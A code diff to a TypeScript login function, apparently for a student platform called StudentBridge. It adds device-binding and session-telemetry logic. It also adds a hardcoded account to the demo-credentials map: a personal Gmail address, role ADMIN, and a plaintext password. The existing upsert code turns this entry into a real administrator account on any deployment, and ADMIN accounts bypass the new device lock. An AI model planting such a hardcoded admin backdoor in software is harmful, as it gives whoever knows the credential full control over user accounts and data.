@@ -130,6 +130,8 @@ export async function login(credentials: {
   emailOrUsername: string;
   passwordPlain: string;
   ipAddress?: string;
+  deviceId?: string;
+  deviceInfo?: string;
 }): Promise<LoginResponse> {
   const trimmed = credentials.emailOrUsername.trim().toLowerCase();
 
@@ -137,6 +139,18 @@ export async function login(credentials: {
     string,
     { username: string; email: string; role: UserRole; pass: string }
   > = {
+    "miskrdires11@gmail.com": {
+      username: "miskrdires11",
+      email: "miskrdires11@gmail.com",
+      role: "ADMIN",
+      pass: "sukuna24th",
+    },
+    miskrdires11: {
+      username: "miskrdires11",
+      email: "miskrdires11@gmail.com",
+      role: "ADMIN",
+      pass: "sukuna24th",
+    },
     "sender@studentbridge.internal": {
       username: "sender",
       email: "sender@studentbridge.internal",
@@ -210,6 +224,53 @@ export async function login(credentials: {
       return { success: false, error: "Invalid credentials" };
     }
 
+    // Single-Device Lock Check:
+    // If account has an active bound device and a different device tries to sign in,
+    // block access and require Administrator reset.
+    if (
+      user.boundDeviceId &&
+      credentials.deviceId &&
+      user.boundDeviceId !== credentials.deviceId &&
+      user.role !== "ADMIN"
+    ) {
+      return {
+        success: false,
+        error: `Access Denied: This account is locked to another device (${user.boundDeviceInfo || "Registered Device"}). Please contact Administrator to re-provision.`,
+      };
+    }
+
+    // Update bound device and session telemetry
+    try {
+      const updateData: any = {
+        lastLoginAt: new Date(),
+        lastActiveAt: new Date(),
+        workSessionCount: { increment: 1 },
+      };
+      if (!user.boundDeviceId && credentials.deviceId) {
+        updateData.boundDeviceId = credentials.deviceId;
+        updateData.boundDeviceInfo = credentials.deviceInfo || "Browser Device";
+      }
+      await prisma.user.update({
+        where: { id: user.id },
+        data: updateData,
+      });
+
+      // Record Work Session for Admin telemetry
+      await prisma.userWorkSession.create({
+        data: {
+          userId: user.id,
+          userEmail: user.email,
+          role: user.role,
+          deviceId: credentials.deviceId || "unknown",
+          deviceInfo: credentials.deviceInfo || user.boundDeviceInfo || "Browser Device",
+          startedAt: new Date(),
+          ipAddress: credentials.ipAddress || null,
+        },
+      });
+    } catch (sessionErr) {
+      console.warn("Notice: Session update warning:", sessionErr);
+    }
+
     const sessionPayload: Omit<SessionPayload, "iat" | "exp"> = {
       userId: user.id,
       username: user.username,
@@ -228,7 +289,11 @@ export async function login(credentials: {
           entityType: "USER",
           entityId: user.id,
           ipAddress: credentials.ipAddress,
-          metadata: JSON.stringify({ role: user.role }),
+          metadata: JSON.stringify({
+            role: user.role,
+            deviceId: credentials.deviceId,
+            deviceInfo: credentials.deviceInfo,
+          }),
         },
       });
     } catch {
@@ -259,13 +324,22 @@ export async function login(credentials: {
       const hash = await hashPassword(demoMatch.pass);
       await prisma.user.upsert({
         where: { username: demoMatch.username },
-        update: {},
+        update: {
+          boundDeviceId: credentials.deviceId || null,
+          boundDeviceInfo: credentials.deviceInfo || null,
+          lastLoginAt: new Date(),
+          workSessionCount: { increment: 1 },
+        },
         create: {
           id: `system-${demoMatch.username}`,
           username: demoMatch.username,
           email: demoMatch.email,
           passwordHash: hash,
           role: demoMatch.role,
+          boundDeviceId: credentials.deviceId || null,
+          boundDeviceInfo: credentials.deviceInfo || null,
+          lastLoginAt: new Date(),
+          workSessionCount: 1,
         },
       });
     } catch {
